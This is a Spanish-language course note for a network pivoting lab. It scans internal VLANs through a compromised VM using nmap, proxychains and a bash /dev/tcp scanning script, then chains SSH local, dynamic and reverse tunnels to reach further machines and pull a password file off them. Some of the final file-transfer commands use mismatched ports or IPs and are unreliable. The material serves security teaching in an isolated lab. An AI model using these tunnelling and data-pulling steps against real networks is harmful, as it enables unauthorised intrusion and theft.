---
title: Pivoting
modulo: M7 - Movimientos laterales
fecha: 2025-07-31
layout: apunte
slug: 2025-07-31-pivoting
vm: https://drive.google.com/drive/folders/10MdL2c8EpwijxsweVVdln4J5d1KG9v9v
---
# üêáPivoting
>[!abstract] Definici√≥n:
>**Pivoting** es el proceso de usar una m√°quina comprometida como trampol√≠n para acceder a otras m√°quinas en la red que ser√≠an inaccesibles directamente desde la m√°quina atacante.

# üíªPr√°ctica
>[!note] **Pre√°mbulo**:
>Para esta pr√°ctica, partimos de las siguientes m√°quinas:
>üîπ **Pivoting VM** (Credenciales ubuntu/ubuntu)
> üîπ**Pivoting VM 2** (Credenciales ubuntu/Pivoting2341)
> üîπ**Pivoting VM 3** (Credenciales ubuntu/3412Pivoting)

La idea es simular un entorno como el siguiente

![[escenario_pivoting.png]]

Donde **Pivoting VM** est√° conectada a las redes *VLAN20* y *VLAN30*, mientras que **Pivoting VM 2** est√° conectada a las redes *VLAN30* y *VLAN40*. Esto significa que hay comunicaci√≥n entre ambas m√°quinas mediante *VLAN30*.

Y, el contexto es que, por -*inserte cualquier raz√≥n*-, la **Kali** consigui√≥ infiltrarse en *VLAN20* y vulnerar la m√°quina **Pivoting VM**. Ahora lo que queremos es "saltar" o "pivotar" hacia la **Pivoting VM 2**

Entonces, configuramos las siguientes redes:
- **VLAN20** con m√°scara de subred 10.0.20.0/24
- **VLAN30** con m√°scara de subred 10.0.30.0/24
- **VLAN40** con m√°scara de subred 10.0.40.0/24

Y configuramos ambas m√°quinas:
- **Pivoting VM** 
	- **Adaptador 1:** Red NAT ‚Üí *VLAN20*
	- **Adaptador 2:** Red NAT ‚Üí *VLAN30*
- **Pivoting VM 2**
	- **Adaptador 1:** Red NAT ‚Üí *VLAN30*
	- **Adaptador 2:** Red NAT ‚Üí *VLAN40*

La idea es conectarnos a la **Pivoting VM** y de ah√≠ saltar a la **Pivoting VM 2**, entonces la **Kali** tambi√©n deber√° estar conectada a la *VLAN20*

![[diagrama_clase_pivoting.png]]

Los comandos clave que construiremos son los siguientes
```bash
ssh <user>@Ip_proxy -p X -L (IpKali):PuertoLocal:IpRemota:22
ssh <user>@Ip_proxy -p X -R IpPivoting1:PuertoPiv1:IpLocal:4444
```

**üí™ MANOS A LA OBRA**

>[!warning] Importante!!:
>Durante esta pr√°ctica se lanzar√°n comandos desde terminales distintas (todas alojadas en la **Kali**). Por favor leer los comentarios adjuntos en cada comando para saber en qu√© terminal deben ir.

## üîéEtapa 1: Reconocimiento de Pivoting VM
>[!question] Qu√© terminales hay que tener abiertas antes de comenzar?:
>‚Üí **Kali** para todos los comandos relacionados a la Kali


Con las 3 m√°quinas configuradas, encendidas y funcionando, hacemos un **escaneo de red desde la terminal Kali**
```bash
#Este comando se ejecuta en la terminal llamada Kali
ip a
sudo arp-scan -l -I eth0
```

**En mi caso**, la IP para la m√°quina **Pivoting VM en la red *VLAN20*** es la `10.0.20.5`, y la IP de la **Kali** es `10.0.20.4`.

Una vez conocida la IP, **abrimos una nueva terminal llamada SSH Piv1** donde nos conectamos mediante ssh a la **Pivoting VM**
```bash
#Este comando se ejecuta en la terminal llamada SSH Piv1
ssh ubuntu@10.0.20.5
```

Dentro de la m√°quina, nos interesa ver si est√° conectada a otras redes, as√≠ que ejecutamos el comando `ip a` para ver el estado de la red de **Pivoting VM**. En mi caso, la m√°quina tiene asignada la IP `10.0.30.4` para la *VLAN30*.

![[pivoting_ip_pivoting_vm.png]]

**IPs identificadas hasta ahora**

| Red     | IP          | M√°quina     |
| ------- | ----------- | ----------- |
| VLAN20  | `10.0.20.4` | Kali        |
| VLAN 20 | `10.0.20.5` | Pivoting VM |
| VLAN30  | `10.0.30.4` | Pivoting VM |

## ‚öôÔ∏èEtapa 2: Configuraci√≥n de t√∫nel
>[!question] Qu√© terminales hay que tener abiertas antes de comenzar?:
>‚Üí **Kali** para todos los comandos relacionados a la Kali

Recordemos que la **Kali** no tiene acceso directo a *VLAN30*, pero **Pivoting VM** s√≠. As√≠ que el siguiente paso es crear un **t√∫nel o proxy** que redirija el tr√°fico desde la **Kali** hacia *VLAN30* a trav√©s de **Pivoting VM**. 

De esta manera podremos lanzar comandos desde la **Kali** pero que vayan a nombre de **Pivoting VM**. Esto ser√° √∫til para **escanear la red *VLAN30***.

En primer lugar, **abrimos una nueva terminal llamada -D 9050** y ejecutamos el comando:
```bash
#Este comando se ejecuta en la terminal llamada "-D 9050"
ssh -D 9050 ubuntu@10.0.20.5
```

Esto crea un **SOCKS proxy** en la m√°quina atacante, escuchando en el puerto `9050`.

>[!question] ¬øQu√© es un SOCKS proxy?:
>Un **SOCKS proxy** es una especie de "t√∫nel universal" que permite enrutar _cualquier tipo de tr√°fico_ (TCP y a veces UDP) a trav√©s de una m√°quina intermedia. Es como decirle a las herramientas:
> >"En vez de conectarte directamente al objetivo, pasa por esta m√°quina de confianza (Pivoting VM) y que _ella_ hable con el objetivo por ti."

Esto significa que, todo lo que se configure para que use `localhost:9050` como proxy... se enviar√° a trav√©s de **Pivoting VM**.

Lo siguiente, entonces, es configurar el **proxy de la Kali**, y para ello utilizamos `proxychains`.

En primer lugar, buscamos el archivo de configuraci√≥n del `proxychains` que nos aplique.
```bash
#Este comando se lanza desde la terminal llamada Kali
ls -la /etc | grep proxychain
```

En mi caso, el archivo es `proxychains4.conf` ‚Üí Consultamos este archivo con `cat` o, editamos directamente con `sudo nano` (es importante lanzarlo con `sudo` para que los cambios se guarden).

**¬øQu√© debemos tener en el archivo?** ‚Üí Las siguientes l√≠neas deben estar **descomentadas** (que no aparezca el s√≠mbolo `#` al principio). En la *ProxyList* debe decir *socks5* y apuntar al puerto que abrimos anteriormente.
```
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
```

**Escaneamos la red *VLAN30* desde la Kali:**
```bash
#Este comando se lanza desde la terminal llamada Kali
proxychains nmap 10.0.30.3-20 -p 22 -sV
```

La salida de este comando deber√≠a verse m√°s o menos as√≠:
>...
>
>[proxychains] Dynamic chain ... 127.0.0.1:9050 ... 10.0.30.4:80 <--- socket error or timeout!
>
>[proxychains] Dynamic chain ... 127.0.0.1:9050 ... 10.0.30.7:80 <--- socket error or timeout!
>
>[proxychains] Dynamic chain ... 127.0.0.1:9050 ... 10.0.30.10:80 ... OK
>
>[proxychains] Dynamic chain ... 127.0.0.1:9050 ... 10.0.30.11:80 ... OK
>
>...

**SI NO ES EL CASO...**

Probar con este comando
```bash
#Este comando se lanza desde la terminal llamada Kali
sudo proxychains nmap -sT -Pn -n -p 20,80 10.0.30.3-20
```

**Y SI AUN AS√ç NO FUNCIONA**

Hay alternativas:
1. Utilizar otra versi√≥n de Kali (preferentemente [la m√°quina compartida en clase](https://drive.google.com/drive/folders/1_sv45Jutib_3Gmp228vTHdC2vdI5UayD)), y empezar desde cero el ejercicio.
2. Cambiar la versi√≥n de `nmap` a otra m√°s antigua que sea compatible con `proxychains`.
3. **Usar un script que nos devuelva lo que buscamos**.

>[!note] Consideraciones:
>Esta etapa (configuraci√≥n de t√∫nel) es necesaria en este ejercicio porque **no conocemos la IP de Pivoting VM 2 en la *VLAN30***. 
>Si no fuera el caso, los pasos relacionados con `proxychains` son, en esencia, opcionales, y podr√≠amos pasar directamente a la etapa de **Pivoting**, a menos que quisi√©ramos ejecutar otros comandos a nombre de **Pivoting VM**.

Por lo anterior, lo m√°s f√°cil es crear un script **en la Kali** que nos diga **cu√°l es la IP de la Pivoting VM 2**. En mi caso lo llam√© `script_proxychains.sh` y contiene el siguiente c√≥digo:
```bash
#!/bin/bash

# Red que se quiere escanear
RED="10.0.30"

# Rango de hosts donde podr√≠a estar Pivoting VM 2
INICIO=3
FIN=20

# Puertos abiertos que se buscan
PUERTOS=(22 80)

# En este archivo se escriben las IPs encontradas
SALIDA="ips_abiertas.txt"
> "$SALIDA"  # Vac√≠a el archivo antes de empezar

echo "[*] Escaneando IPs con puertos abiertos..."
echo "[!] Pulsa 'q' en cualquier momento para detener la ejecuci√≥n."

for host in $(seq $INICIO $FIN); do
  IP="$RED.$host"

  # Verifica si el usuario ha pulsado 'q'
  read -t 1 -n 1 key
  if [[ $key = "q" ]]; then
    echo "[!] Escaneo cancelado por el usuario."
    break
  fi

  for port in "${PUERTOS[@]}"; do
    if proxychains timeout 3 bash -c "echo > /dev/tcp/$IP/$port" 2>/dev/null; then
      echo "$IP tiene el puerto $port abierto"
      echo "$IP:$port" >> "$SALIDA"
    else
      echo "$IP puerto $port cerrado o sin respuesta"
    fi
  done
done

echo "[+] IPs con puertos abiertos guardadas en: $SALIDA"
```

Este script automatiza la detecci√≥n de **hosts activos** en una red interna (oculta tras pivoting), comprobando si tienen **puertos espec√≠ficos abiertos** (como 22 u 80) realizando intentos de conexi√≥n utilizando `/dev/tcp/<IP>/<puerto>`, que es una funcionalidad interna de bash que intenta abrir una conexi√≥n TCP. Adem√°s, utiliza `proxychains` para enrutar el tr√°fico a trav√©s de un t√∫nel SOCKS previamente establecido (en este caso, mediante `ssh -D`).

Una vez creado el script, le damos permisos de ejecuci√≥n y lo ejecutamos
```bash
# Estos comandos se lanzan en la terminal llamada "Kali"
chmod +x script_proxychains.sh
./script_proxychains.sh
```

Ahora solo queda esperar a que detecte la IP de **Pivoting VM 2**. En mi caso, la IP es `10.0.30.5`


>[!warning] Importante:
>Este script tambi√©n nos mostrar√° la IP de **Pivoting VM** en la *VLAN30*, por lo cual hay que tenerlas bien identificadas.

Una vez que logramos el objetivo, podemos cerrar la terminal llamada "-D 9050"

**IPs identificadas hasta ahora**

| Red    | IP          | M√°quina       |
| ------ | ----------- | ------------- |
| VLAN20 | `10.0.20.4` | Kali          |
| VLAN20 | `10.0.20.5` | Pivoting VM   |
| VLAN30 | `10.0.30.4` | Pivoting VM   |
| VLAN30 | `10.0.30.5` | Pivoting VM 2 |


## ü¶òEtapa 3: Pivotando a Pivoting VM 2
>[!question] Qu√© terminales hay que tener antes de comenzar?:
>‚Üí **Kali** para todos los comandos relacionados a la Kali

Ahora que conocemos la IP de **Pivoting VM 2**, podemos establecer un **t√∫nel ssh con port forwarding**, para lo cual **abrimos una nueva terminal llamada -L Piv2**, y lanzamos el siguiente comando:
```bash
#Este comando se lanza desde la terminal llamada "-L Piv2"
ssh ubuntu@10.0.20.5 -L 2222:10.0.30.5:22
```
üîπ **Donde:**
- El flag `-L` es de **port forwarding local**, y su sintaxis general es:
	- `-L [puerto_local]:[IP_objetivo_visible_para_el_host_remoto]:[puerto_objetivo]`

En este caso:

| Parte       | Significado                                               |     |
| ----------- | --------------------------------------------------------- | --- |
| `2222`      | Puerto en la **Kali** que se abrir√° como punto de entrada |     |
| `10.0.30.5` | IP objetivo, accesible desde **Pivoting VM**              |     |
| `22`        | Puerto SSH de **Pivoting VM 2**                           |     |

**¬øQu√© hace este comando?** ‚Üí Abre un puerto local (2222) que se conecta _desde Pivoting VM_ a _Pivoting VM 2_ por su puerto 22. 

En otras palabras, el comando da la siguiente instrucci√≥n:

>Con√©ctate por SSH a la m√°quina `10.0.20.5` (Pivoting1), y desde all√≠ crea un t√∫nel que me permita acceder **desde mi Kali (localhost)** al puerto **22 de Pivoting VM 2** (`10.0.30.5`) como si lo tuviera aqu√≠ mismo, en el puerto **2222**

**¬øQu√© conseguimos con esto?** ‚Üí Exponer el servicio SSH de **Pivoting VM 2** (que solo es accesible desde **Pivoting VM**) en la m√°quina **Kali**, en el puerto 2222.

Este paso nos permite pasar al siguiente comando. **Abrimos una nueva terminal llamada SSH PIV2** y lanzamos el comando que nos conectar√° por *ssh* a la **Pivoting VM 2**
```bash
#Este comando se ejecuta en una nueva terminal llamada "SSH PIV2"
ssh ubuntu@localhost -p 2222
```
Este comando pedir√° ingresar las credenciales de **Pivoting VM 2**

**T√∫neles abiertos hasta ahora**

| Puerto | Desde donde conecta  | Hacia d√≥nde conecta |
| ------ | -------------------- | ------------------- |
| `2222` | **Kali** (localhost) | **Pivoting VM 2**   |


## ü¶òEtapa 4: Pivotando hacia Pivoting VM 3

>[!question] Qu√© terminales hay que tener antes de comenzar?:
‚Üí **Kali** para todos los comandos relacionados a la Kali
‚Üí **T√∫nel a Piv2** donde ejecutamos el comando `ssh ubuntu@10.0.20.5 -L 2222:10.0.30.5:22` para conectar un t√∫nel al ssh de la **Pivoting VM 2** en el puerto `2222` de la **Kali**
‚Üí**SSH Piv2** donde ejecutamos el comando `ssh ubuntu@localhost -p 2222` para conectarnos por *ssh* a la m√°quina **Pivoting VM 2**

Una vez conectados a **Pivoting VM 2**, analizamos las direcciones IP de la m√°quina con el comando `ip a`. En mi caso, tiene asignada la IP `10.0.40.4` para la *VLAN40*.

Despu√©s ser√° necesario crear un nuevo t√∫nel de proxy, pero ahora para utilizar a la **Pivoting VM 2** como proxy de la **Kali**. Para ello, **abrimos una  nueva terminal llamada -D 9050 Piv2**
```bash
#Este comando se lanza en la terminal llamada "-D 9050 Piv2"
ssh ubuntu@localhost -p 2222 -D 9050
```
Pedir√° credenciales de **Pivoting VM 2**

Ahora, hacemos el escaneo de red *VLAN40* con el comando
```bash
#Este comando se lanza desde la terminal llamada Kali
proxychains nmap 10.0.40.3-20 -p 22 -sV
```

O bien,
```bash
#Este comando se lanza desde la terminal llamada Kali
sudo proxychains nmap -sT -Pn -n -p 20,80 10.0.40.3-20
```

O bien, utilizando el `script_proxychains.sh` **cambiando los par√°metros para que escanee la VLAN40**.

De este escaneo, se obtiene la IP de la m√°quina **Pivoting VM 3**, que en mi caso es `10.0.40.5`. Ya podemos cerrar la terminal llamada "-D 9050 Piv2".
![[pivoting_proxychains_en_vm2.png]]

**IPs identificadas hasta ahora**

| Red      | IP          | M√°quina           |
| -------- | ----------- | ----------------- |
| *VLAN20* | `10.0.20.4` | **Kali**          |
| *VLAN20* | `10.0.20.5` | **Pivoting VM**   |
| *VLAN30* | `10.0.30.4` | **Pivoting VM**   |
| *VLAN30* | `10.0.30.5` | **Pivoting VM 2** |
| *VLAN40* | `10.0.40.4` | **Pivoting VM 2** |
| *VLAN40* | `10.0.40.5` | **Pivoting VM 3** |


**En una nueva terminal llamada -L Piv3 pt 80**, abrimos el t√∫nel para conectar la **Kali** al puerto 80 de la **Pivoting VM 3** desde el puerto 8081 en la **Kali**.
```bash
#Este comando se lanza desde la terminal llamada "-L Piv3 pt 80"
ssh ubuntu@localhost -p 2222 -L 8081:10.0.40.5:80
```
Este comando pedir√° las credenciales de **Pivoting VM 2**

**T√∫neles abiertos hasta ahora**

| Puerto | Desde donde conecta  | Hacia d√≥nde conecta                                         |
| ------ | -------------------- | ----------------------------------------------------------- |
| `2222` | **Kali** (localhost) | **Pivoting VM 2** (puerto 22)                               |
| `8081` | **Kali** (localhost) | **Pivoting VM 3** (puerto 80) a trav√©s de **Pivoting VM 2** |

Entonces, ahora podemos abrir la web entrando al enlace `localhost:8081` desde el navegador.

>[!note] Nota:
>Para poder hacer fuzzing necesitamos volver a tener el proxy activado.
>```bash
>#Este comando se lanza en la terminal llamada "-D 9050" y pide las credenciales de Pivoting 2
>ssh ubuntu@localhost -p 2222 -D 9050
>```

Para abrir el puerto 80 de **Pivoting VM 2** en la **Kali**
```bash
#Este comando se lanza desde la terminal llamada "-L Piv3"
ssh ubuntu@localhost -p 2222 -L 8080:10.0.30.5:80
```
Pedir√° credenciales de **Pivoting VM 2**

**T√∫neles abiertos hasta ahora**

| Puerto | Desde donde conecta  | Hacia d√≥nde conecta                                         |
| ------ | -------------------- | ----------------------------------------------------------- |
| `2222` | **Kali** (localhost) | **Pivoting VM 2** (puerto 22)                               |
| `8081` | **Kali** (localhost) | **Pivoting VM 3** (puerto 80) a trav√©s de **Pivoting VM 2** |
| `8080` | **Kali** (localhost) | **Pivoting VM 2** (puerto 80)                               |

**Abrimos una terminal nueva con el nombre -L Piv3 pt 22** para abrir el puerto 22 de la **Pivoting VM 3** en la **Kali**
```bash
#Este comando se lanza desde la terminal llamada "-L Piv3 pt 22"
ssh ubuntu@localhost -p 2222 -L 2223:10.0.40.5:22
```
Pedir√° las credenciales de **Pivoting VM 2**

**T√∫neles abiertos hasta ahora**

| Puerto | Desde donde conecta  | Hacia d√≥nde conecta                                         |
| ------ | -------------------- | ----------------------------------------------------------- |
| `2222` | **Kali** (localhost) | **Pivoting VM 2** (puerto 22)                               |
| `8081` | **Kali** (localhost) | **Pivoting VM 3** (puerto 80) a trav√©s de **Pivoting VM 2** |
| `8080` | **Kali** (localhost) | **Pivoting VM 2** (puerto 80)                               |
| `2223` | **Kali** (localhost) | **Pivoting VM 3** (puerto 22) a trav√©s de **Pivoting VM 2** |

Una vez establecidos los t√∫neles, ya podemos conectarnos a **Pivoting VM 3**, en una **terminal nueva llamada SSH Piv3**
```bash
#Este comando se lanza en la terminal "SSH Piv3"
ssh ubuntu@localhost -p 2223
```
Pide credenciales de **Pivoting VM 3** (3412Pivoting)

# üìùC√≥mo pasar archivos entre m√°quinas

**En la m√°quina que contiene el archivo que queremos obtener** (la **Pivoting VM 3** en este caso), ejecutamos el siguiente comando para abrir un servidor con python.
```bash
#Este comando se lanza en la terminal ssh Piv3
sudo python3 -m http.server 443
```

Luego, **en la Kali**, lanzamos el comando para descargar el archivo, donde el puerto debe coincidir con el puerto configurado en el t√∫nel de la m√°quina correspondiente.
```bash
#Este comando se lanza en la terminal Kali
wget http://localhost:2223/contrase√±a.txt/
```


# üîÑÔ∏èT√∫nel reverso
```bash
#Este comando se lanza en la terminal -R 4444 Piv2
ssh ubuntu@localhost -p 2223 -R 10.0.40.5:4444:10.0.20.4:80
```
Pedir√° las credenciales de **Pivoting VM 2**

```bash
#Este se lanza desde Kali
python3 -m http.server 80
```

Solicitar documentos a la **Kali** desde la **Pivoting VM 2** o la **Pivoting VM 3** 
```bash
#Este comando se lanza en la terminnal -R 4444 Piv3
wget http://10.0.40.4:4444/movimientos.txt
```
